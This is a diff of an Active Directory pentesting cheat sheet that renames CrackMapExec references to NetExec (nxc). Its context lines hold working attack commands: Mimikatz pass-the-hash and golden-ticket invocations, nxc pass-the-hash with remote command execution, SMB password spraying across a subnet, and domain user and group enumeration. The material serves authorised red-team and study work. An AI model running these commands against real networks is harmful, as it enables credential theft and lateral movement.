@@ -188,7 +188,7 @@ sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe
 
 **Linux:**
 ```bash
-# CrackMapExec
+# NetExec (nxc)
 nxc smb 10.10.10.10 -u administrator -H hash
 nxc smb 10.10.10.10 -u administrator -H hash -x whoami
 
@@ -271,7 +271,7 @@ kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /tar
 
 ## Lateral Movement
 
-**CrackMapExec:**
+**NetExec (nxc):**
 ```bash
 # SMB spray
 nxc smb 10.10.10.0/24 -u user -p password
@@ -326,7 +326,7 @@ Get-DomainGroupMember "Domain Admins"
 
 **Linux Enumeration:**
 ```bash
-# crackmapexec
+# NetExec (nxc, formerly CrackMapExec)
 nxc smb 10.10.10.0/24 -u user -p password --users
 nxc smb 10.10.10.0/24 -u user -p password --groups
 
@@ -358,7 +358,7 @@ ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=
 - **Mimikatz** - Credential dumping (Windows)
 - **Impacket** - Comprehensive toolkit (Linux)
 - **BloodHound** - AD relationship graphing
-- **CrackMapExec** - Swiss army knife for AD
+- **NetExec (nxc)** - Swiss army knife for AD (the maintained successor to the archived CrackMapExec)
 - **PowerView** - AD enumeration (PowerShell)
 - **evil-winrm** - WinRM access (Linux)
 
